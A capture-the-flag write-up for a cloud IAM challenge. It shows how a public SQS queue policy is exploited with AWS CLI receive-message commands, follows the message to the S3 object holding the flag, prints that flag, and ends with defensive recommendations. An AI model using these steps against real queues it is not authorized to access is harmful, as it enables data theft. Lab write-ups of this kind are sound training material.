# Writeup for Big IAM Challenge: Challenge 2

# Challenge number

    2

## Challenge Statement

The objective of this challenge was to capture the flag by identifying and exploiting overly permissive IAM policies related to AWS SQS (Simple Queue Service). Participants needed to analyze the policy, interact with the SQS queue using the AWS CLI, and retrieve the flag from a message in the queue.

## IAM Policy

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

### Short analysis about the IAM policy

```
* What do I have access to?
  - The policy allows anyone (`Principal: "*"`) to send messages (`sqs:SendMessage`) and receive messages (`sqs:ReceiveMessage`) from the specified SQS queue (`arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2`).

* What don't I have access to?
  - The policy does not grant access to other actions like deleting the queue, purging messages, or modifying queue attributes.

* What do I find interesting?
  - The policy exposes the queue to public interaction, which could lead to unauthorized users retrieving sensitive information or spamming the queue with irrelevant messages.
```

## Solution

Step 1: Identified Accessible Queue

Upon attempting to list the SQS queues using the aws sqs list-queues command, I encountered an access denial error:

    aws sqs list-queues

An error occurred (AccessDenied) when calling the ListQueues operation: User: arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell is not authorized to perform: sqs:listqueues on resource: arn:aws:sqs:us-east-1:657483584613: because no identity-based policy allows the sqs:listqueues action

This error indicates that my IAM role doesn't have permission to list the queues.

Step 2: Retrieved Messages from the Queue

Despite the access denial when listing queues, I proceeded with the next logical step: retrieving messages directly from the known queue URL using the aws sqs receive-message command:

aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --attribute-names All

This returned a message containing a URL to an S3 object:
{
"Messages": [
{
"MessageId": "d9eb89bf-887b-4485-9492-4356f31714b7",
"ReceiptHandle": "AQEB4i32ojDgnwqDa+oW/8rQX/WeolHf1qw/Te576bhotWY1Kjp0e4rqzqwm7VN20i4hQSB68QSsrulYVXbjLxquUbBALS
b9HuHjPCPbmTTB05qwfSnJncKgFR3QklPcQb9XHHTylQeJM+CmNaMva0dYeeGtxlptuitbls87MIKMKbEbGDyhD19ghrNIXidD+cJ9aNWFNYQ6qX3xuWLyjFhQow
NNbW822o7ATj2T8gAqdHVP2gcNxZKAwFUggkqbyz6YGGYiiGUnZfMf9bKbw3/DCTZr8CQJtIVuUwIcH77t26Cl2tR7wTJJEOp1XUOYG8BJos+aaRFQsetICkYfbm
VPyrWKuDVQee+whA02E2xdwb0LykwuaxSCCRdknUAgkJjkxj0I9J8hobLMJ9MInWdYd/7ruv9P4oabajVAaSOuuFY=",
"MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
"Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\
": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}",
"Attributes": {
"SenderId": "AROARK7LBOHXGHGQ5XCT5:tbic-wiz-send-flag-to-sqs-8d265a4",
"ApproximateFirstReceiveTimestamp": "1737751264648",
"ApproximateReceiveCount": "1",
"SentTimestamp": "1737748948409",
"AWSTraceHeader": "Root=1-6793f1d4-3d95a53a66746b040ddd4874;Parent=012caf6aabd08dd6;Sampled=0;Lineage=1:037b
ed70:0"
}
}
]
}

Step 3: Accessed the URL

The URL provided in the message directed me to the flag. The URL is:

https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html

I accessed this URL and found the flag content hidden within the HTML file.

Step 4: Captured the Flag

The content retrieved from the HTML file revealed the flag:

Flag Content: {wiz:you-are-at-the-front-of-the-queue}

Step 5: Submitted the Flag

Finally, I inserted the flag found in the "Insert flag here" textbox and I was redirected to success screen.

## Reflection

- What was your approach?
  My approach involved analyzing the IAM policy to identify access permissions, using AWS CLI commands to retrieve messages from the queue, and following the URL in the message to access the file containing the flag.

- What was the biggest challenge?
  The biggest challenge was encountering the access denial error when trying to list SQS queues. However, I was able to proceed by directly accessing the known queue and retrieving the message.

- How did you overcome the challenges?
  By bypassing the need to list queues and directly targeting the queue using the correct URL, I was able to retrieve the flag message.

- What led to the breakthrough?
  The realization that even though I couldn't list the queues, I could still interact with the queue and retrieve its messages using the sqs:ReceiveMessage permission led to the breakthrough.

- On the blue side, how can the learning be used to properly defend important assets?

  - Avoid overly permissive IAM policies (e.g., Principal: "\*"), which expose critical resources like SQS to the public.
  - Implement stricter controls by restricting access to trusted users or roles.
  - Consider encrypting sensitive data in transit and at rest.
  - Regularly audit and review IAM policies, especially for sensitive resources like SQS and S3.
  - Use specific actions rather than wildcard permissions to limit unnecessary exposure.
